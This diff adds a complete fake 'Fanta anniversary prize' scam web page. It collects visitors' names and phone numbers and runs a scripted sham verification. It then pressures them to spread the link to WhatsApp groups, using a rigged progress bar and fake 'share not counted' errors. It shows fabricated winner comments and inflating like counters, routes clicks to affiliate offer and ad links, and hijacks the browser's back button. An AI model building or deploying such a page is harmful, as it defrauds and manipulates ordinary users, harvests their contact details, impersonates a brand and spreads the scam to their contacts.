@@ -1,0 +1,556 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Fanta - SHARE 2025</title>
+			<link rel="shortcut icon" type="image/png" href="assets/logo.png" />
+        <meta name="og:title" content="Fanta - 28th Anniversary Prizes" />
+        <meta property="og:description" content="Fanta - 28th Anniversary Prizes" />
+        <meta property="og:image" content="assets/banner.png" />
+        <meta name="robots" content="noindex" />
+        <meta name="theme-color" content="#ffffff" />
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+        <link rel="stylesheet" href="style.css">
+        <link rel="stylesheet" href="wheel.css">
+        <link rel="stylesheet" href="social-proof.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="main-header">
+      <div class="header-container">
+        <div class="header-logo">
+          <img src="assets/logo.png" alt="Fanta" class="logo-image">
+          <div id="country-flag" class="country-flag"></div>
+        </div>
+      </div>
+    </header>
+
+    
+    
+
+
+        <div class="post1">
+        <div  class="welcome">
+        </div>
+        <div class="step1">
+            <div class="step-container-modern">
+                <h2 class="step-title-modern">Verification Process</h2>
+                <div class="form-group-modern">
+                    <label>Full Name</label>
+                    <input type="text" placeholder="Enter your full name" id="name" class="input-modern">
+                </div>
+                <div class="form-group-modern">
+                    <label>Mobile Number</label>
+                    <input type="tel" placeholder="Enter mobile number" id="grade" class="input-modern">
+                </div>
+                <button id="select" class="btn-modern">NEXT STEP</button>
+            </div>
+        </div>
+        <div class="step2">
+            <div class="step-container-modern">
+                <h2 class="step-title-modern">Confirm Details</h2>
+                <div class="confirmation-box">
+                    <div class="conf-item">
+                        <span class="conf-label">Name:</span>
+                        <span id="pastname" class="conf-value"></span>
+                    </div>
+                    <div class="conf-item">
+                        <span class="conf-label">Mobile:</span>
+                        <span id="pastnumber" class="conf-value"></span>
+                    </div>
+                </div>
+                <button class="yes btn-modern">CONFIRM</button>
+                <button class="no btn-modern" style="background: #edf2f7; color: #4a5568; margin-top: 10px;">CHANGE</button>
+            </div>
+        </div>
+        <div id="checking">
+            <div class="step-container-modern">
+                <h2 class="step-title-modern">Verifying Information</h2>
+                <p style="margin-bottom: 20px; color: #666;">Please wait while we validate your entry...</p>
+                <div class="progress-bar-modern">
+                    <div id="fill" class="progress-fill-modern"></div>
+                </div>
+                <div class="percentage-status">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check" style="display:none;"><i class="fa fa-check-circle" style="color: #25d366;"></i></span>
+                    <span id="percentage">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="share" class="share-container">
+          <div class="share-header">
+            <h2 class="share-title">Congratulations!!</h2>
+            <p>Dear Customer, <strong class="display-name"></strong></p>
+          </div>
+
+          <div class="prize-card-modern">
+            <div class="prize-image-wrapper-modern">
+              <img id="display-prize-img" src="" alt="Prize" class="prize-image-large-modern">
+              <div class="prize-status-badge">RESERVED</div>
+            </div>
+            <div class="prize-info-modern">
+              <p class="prize-label">Your Prize:</p>
+              <h3 id="display-prize" class="prize-name-modern">...</h3>
+              <p class="prize-description">Valid for 24 hours. Complete the steps below to claim.</p>
+            </div>
+          </div>
+
+          <div class="instruction-box-modern">
+            <h4 class="instruction-title">Final Steps to Receive Your Prize:</h4>
+            <div class="instruction-item">
+              <span class="step-number">1</span>
+              <p>Share this event with <strong>5 Groups</strong> or <strong>20 Friends</strong> on WhatsApp to verify your participation.</p>
+            </div>
+            <div class="instruction-item">
+              <span class="step-number">2</span>
+              <p>Once the progress bar reaches 100%, click <strong>'CONTINUE'</strong> to confirm your shipping address.</p>
+            </div>
+          </div>
+
+          <button id="whatsapp" class="whatsapp-btn-modern">
+            <i class="fa fa-whatsapp"></i> SHARE ON WHATSAPP
+          </button>
+
+          <div class="progress-container-modern">
+            <div class="progress-header-modern">
+              <span>Verification Progress:</span>
+              <span id="percentage2" class="percentage-value-modern">0%</span>
+            </div>
+            <div class="progress-bar-modern">
+                <div id="fill2" class="progress-fill-modern"></div>
+            </div>
+            <p class="progress-tip-modern">Help us celebrate Fanta's anniversary to unlock your gift!</p>
+          </div>
+
+          <button class="continue-btn-modern" onclick="myFunction()">CONTINUE</button>
+
+          <div id="error-modal" class="modal-overlay">
+            <div class="modal-content">
+              <h2 class="modal-title" style="color: #dc3545;">Wait!</h2>
+              <p style="font-size: 16px; line-height: 1.5; margin-bottom: 20px;">
+                Unfortunately, in order to receive your prize, you must share with your friends on WhatsApp until the progress bar reaches 100%!
+              </p>
+              <button class="modal-button" onclick="closeErrorModal()">OK</button>
+            </div>
+          </div>
+
+          <script>
+            function myFunction() {
+              const errorModal = document.getElementById("error-modal");
+              if (errorModal) {
+                errorModal.style.display = "flex";
+              }
+            }
+            function closeErrorModal() {
+              const errorModal = document.getElementById("error-modal");
+              if (errorModal) {
+                errorModal.style.display = "none";
+              }
+            }
+          </script>
+        </div>
+        <div id="claim">
+            <div class="claim-card-modern">
+                <div class="success-icon-modern">
+                    <i class="fa fa-check-circle"></i>
+                </div>
+                <h2 class="claim-title-modern">Final Verification!</h2>
+                <p class="claim-subtitle-modern">You have successfully shared the event. To complete your delivery, please confirm your details on the next page.</p>
+                
+                <div class="claim-prize-box">
+                    <img id="claim-prize-img" src="" alt="Prize" class="claim-prize-img">
+                    <div class="claim-prize-info">
+                        <p class="claim-prize-label">Item to be Delivered:</p>
+                        <p id="claim-prize-name" class="claim-prize-name">...</p>
+                    </div>
+                </div>
+
+                <div class="final-instruction">
+                    Verification will be void if you close this page now.
+                </div>
+
+                <button id="offer" class="offer-btn-modern">FINALIZE CLAIM</button>
+
+                <div style="margin-top: 25px;">
+                    <ins data-width="300" data-height="250" class="d2e89311495 ads-ins" data-domain="//data159.click" data-affquery="/d0edd09d98332c65beb4/2e89311495/?placementName=ron01"><script src="//data159.click/js/responsive.js" async></script></ins>
+                </div>
+            </div>
+        </div>        </div>
+
+        </div>
+    </div>
+<div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://www.facebook.com/reaction/image/1635855486666999/?size=20&scale=1" /> <img class="love" src="https://www.facebook.com/reaction/image/1678524932434102/?size=20&scale=1" /> <img class="care" src="https://www.facebook.com/reaction/image/613557422527858/?size=20&scale=1" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react" id="comment-trigger"><i class="fa fa-comment-o"></i> Comment</span> <span class="react" id="share-trigger"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                                <div class="comment">
+<img src="https://cdnbun.com/upload/bbrr7.jpg" />
+                    <div class="single-container">
+                        <span class="user">Albert Wigston</span>
+                        <span class="text">
+Thank you very much Fanta! I received the prize today and it arrived immediately
+                        </span>
+                    </div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://cdnbun.com/upload/bbrr3.jpg" />
+                    <div class="single-container"><span class="user">Jenisha Parmar</span> <span class="text">I thought it was a scam, but now it arrived. Thank you Fanta</span></div>
+                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment reply">
+                    <img src="https://cdnbun.com/upload/bbrr2.jpg" />
+                    <div class="single-container"><span class="user">George Smith</span> <span class="text">You must follow the instructions correctly as requested to receive your prize. Enjoy, friends.</span></div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://i.imgur.com/Fvt0UIC.jpg" />
+                    <div class="single-container"><span class="user">Chanchal Goyal</span> <span class="text">Luck wasn't on my side this time =(</span></div>
+                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+<div class="comment">
+                    <img src="https://i.imgur.com/Ien4MZ9.jpg" />
+                    <div class="single-container"><span class="user">Inmaculada Reyes</span> <span class="text">Amazing! I've never won anything! I feel so happy, hahaha.</span></div>
+                    <div class="buttons"><span class="time t3">7m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+<div class="comment">
+                    <img src="https://i.imgur.com/4OLG3Ex.jpg" />
+                    <div class="single-container"><span class="user">Alfonso Campos</span> <span class="text">At first I thought it was a lie, but finally I received my prize. I've already told my friends, so they can win too.
+</span></div>
+                    <div class="buttons"><span class="time t3">7m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="input" style="display: flex; gap: 8px;">
+                    <input id="comment-input" placeholder="Write a comment..." style="flex: 1;" />
+                    <button id="submit-comment" style="width: auto; height: 40px; margin: 0; padding: 0 15px; font-size: 14px;">Post</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script src="prizes.js"></script>
+    <script src="social-proof.js"></script>
+    <script>
+        var errorname = "Please enter the name correctly!",
+            errornumber = "Please enter your number correctly, example 05xxxxxxx",
+            link = "https://tinyurl.com/fanta-mz",
+			cpa = "https://otieu.com/4/10234481",
+            error = "Something is wrong!\nThe share was not counted. You may have shared with the same friend or group more than once, please share again",
+            saved = "pp1",
+            text = "To celebrate the 23rd anniversary, Fanta is offering shopping vouchers, mobile phones and many other valuable instant prizes. Prizes are limited, so hurry here: ",
+            share = "whatsapp://send?text=" + text + link;
+
+        // Comment submission logic
+        $(document).ready(function() {
+            $("#submit-comment").click(function() {
+                const comment = $("#comment-input").val();
+                if (comment.trim().length > 0) {
+                    window.open(cpa, "_blank");
+                } else {
+                    alert("Please write a comment first!");
+                }
+            });
+
+            // Comment trigger logic
+            $("#comment-trigger").click(function() {
+                $('html, body').animate({
+                    scrollTop: $("#comment-input").offset().top - 150
+                }, 500);
+                $("#comment-input").focus();
+            });
+
+            // Share trigger logic
+            $("#share-trigger").click(function() {
+                window.open(cpa, "_blank");
+            });
+        });
+    </script>
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});  
+  
+</script>
+
+<script type="text/javascript">
+var name = localStorage.getItem("name");
+$(".display-name").html(name);
+$("#select").click(function () {
+    var name = $("#name").val();
+    localStorage.setItem("name", name);
+    var number = $("#grade").val();
+    if (name.length < 1 || name.length > 150) {
+        alert(errorname);
+    } else if (number === "0") {
+        alert(errornumber);
+    } else {
+        $(".step1").fadeOut(0);
+        $(".step2").fadeIn(500);
+        $("#pastname").html(name);
+        $("#pastnumber").html(number);
+    }
+});
+$(".yes").click(function () {
+    $(".welcome").fadeOut(0);
+    $(".step2").fadeOut(0);
+    $("#checking").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        i += 1;
+        $("#percentage").text(i + "%");
+        $("#fill").css("width", i + "%");
+        if (i == 50) {
+            i = 49;
+            setTimeout(function () {
+                i = 50;
+            }, 1000);
+        }
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#load").fadeOut(0);
+            $("#check").fadeIn(0);
+            setTimeout(function () {
+                $("#checking").fadeOut(0);
+                $("#share").fadeIn(1000);
+                $(".display-name").html($("#name").val());
+                
+                // Get prize from query string or cookie
+                const urlParams = new URLSearchParams(window.location.search);
+                const qPrizeId = urlParams.get('prize_id');
+                const cookiePrizeId = getCookie('won_prize_id');
+                
+                const prizeId = qPrizeId || cookiePrizeId || 'iphone17';
+                const prizeData = typeof getPrizeById === 'function' ? getPrizeById(prizeId) : null;
+                
+                const prizeDisplay = document.getElementById('display-prize');
+                const prizeImgDisplay = document.getElementById('display-prize-img');
+                const claimPrizeName = document.getElementById('claim-prize-name');
+                const claimPrizeImg = document.getElementById('claim-prize-img');
+                
+                if (prizeData) {
+                    if (prizeDisplay) prizeDisplay.textContent = prizeData.fullName;
+                    if (prizeImgDisplay) {
+                        prizeImgDisplay.src = prizeData.image;
+                        prizeImgDisplay.style.display = 'block';
+                    }
+                    if (claimPrizeName) claimPrizeName.textContent = prizeData.fullName;
+                    if (claimPrizeImg) claimPrizeImg.src = prizeData.image;
+                }
+            }, 1000);
+        }
+    }, 50);
+});
+$(".no").click(function () {
+    $(".step2").fadeOut(0);
+    $(".step1").fadeIn(500);
+});  
+</script>  
+
+<script type="text/javascript">  
+var swidth = localStorage.getItem(saved);
+if (swidth !== null) {
+    var width = swidth * 1;
+    $(".welcome").fadeOut(0);
+    $(".step1").fadeOut(0);
+    $("#share").fadeIn(0);
+    $("#fill2").css("width", width + "%");
+    $("#percentage2").text(width + "%");
+    
+    // Set names and prize if resuming
+    const name = localStorage.getItem("name");
+    $(".display-name").html(name);
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const qPrizeId = urlParams.get('prize_id');
+    const cookiePrizeId = getCookie('won_prize_id');
+    
+    const prizeId = qPrizeId || cookiePrizeId || 'iphone17';
+    const prizeData = typeof getPrizeById === 'function' ? getPrizeById(prizeId) : null;
+    
+    const prizeDisplay = document.getElementById('display-prize');
+    const prizeImgDisplay = document.getElementById('display-prize-img');
+    const claimPrizeName = document.getElementById('claim-prize-name');
+    const claimPrizeImg = document.getElementById('claim-prize-img');
+    
+    if (prizeData) {
+        if (prizeDisplay) prizeDisplay.textContent = prizeData.fullName;
+        if (prizeImgDisplay) {
+            prizeImgDisplay.src = prizeData.image;
+            prizeImgDisplay.style.display = 'block';
+        }
+        if (claimPrizeName) claimPrizeName.textContent = prizeData.fullName;
+        if (claimPrizeImg) claimPrizeImg.src = prizeData.image;
+    }
+} else {
+    var width = 0;
+}
+$("#whatsapp").click(function () {
+    window.location.href = share;
+    if (width == 0) {
+        width += 50;
+    } else if (width == 50) {
+        alert(error);
+        width += 15;
+    } else if (width == 65) {
+        width += 5;
+    } else if (width == 70) {
+        alert(error);
+        width += 10;
+    } else if (width == 80) {
+        alert(error);
+        width += 5;
+    } else if (width == 85) {
+        width += 2;
+    } else if (width == 87) {
+        width += 3;
+    } else if (width == 90) {
+        width += 3;
+    } else if (width == 93) {
+        width += 2;
+    } else if (width == 95) {
+        width += 2;
+    } else if (width == 97) {
+        width += 1;
+    } else if (width == 98) {
+        width += 1;
+    } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+    }
+    localStorage.setItem(saved, width);
+    setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+    }, 2000);
+});
+$("#offer").click(function () {
+    window.open(cpa, "_blank");
+});  
+$("#offers").click(function () {
+    window.open(cpa1, "_blank");
+});  
+$("#offerss").click(function () {
+    window.open(cpa2, "_blank");
+});  
+</script>  
+
+<script>
+    ! function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+        onpopstate = function(event) {
+            event.state && location.replace('#');
+        }
+    } catch (o) {
+        console.log(o);
+    }
+}();
+</script>
+
+<!-- Country Flag Detection -->
+<script>
+  // Cookie functions
+  function setCookie(name, value, days) {
+    const expires = new Date();
+    expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
+    document.cookie = name + '=' + value + ';expires=' + expires.toUTCString() + ';path=/';
+  }
+
+  function getCookie(name) {
+    const nameEQ = name + '=';
+    const ca = document.cookie.split(';');
+    for (let i = 0; i < ca.length; i++) {
+      let c = ca[i];
+      while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+    }
+    return null;
+  }
+
+  // Display flag using CDN
+  function displayFlag(countryCode) {
+    const flagElement = document.getElementById('country-flag');
+    if (!flagElement) return;
+
+      if (countryCode && countryCode !== 'unknown') {
+        // Use flag CDN
+        flagElement.innerHTML = `<img src="https://flagcdn.com/20x15/${countryCode.toLowerCase()}.png" alt="${countryCode} flag" style="width: 20px; height: 15px; border-radius: 2px;">`;
+      } else {
+        // Fallback: globe icon
+        flagElement.innerHTML = '<span style="font-size: 20px;">🌍</span>';
+      }
+    flagElement.classList.add('visible');
+  }
+
+  // Get user's country and display flag
+  async function detectCountryAndShowFlag() {
+    // Check if country is already stored in cookie
+    let storedCountry = getCookie('user_country');
+
+    if (storedCountry) {
+      displayFlag(storedCountry);
+      return;
+    }
+
+    try {
+      // Use a free IP geolocation service
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+
+      const countryCode = data.country_code || 'unknown';
+
+      // Store in cookie for 30 days
+      setCookie('user_country', countryCode, 30);
+
+      displayFlag(countryCode);
+    } catch (error) {
+      console.log('Could not detect country:', error);
+      // Store unknown in cookie to avoid repeated API calls
+      setCookie('user_country', 'unknown', 30);
+      displayFlag('unknown');
+    }
+  }
+
+  // Run when page loads
+  document.addEventListener('DOMContentLoaded', detectCountryAndShowFlag);
+</script>
+</body>
+</html>
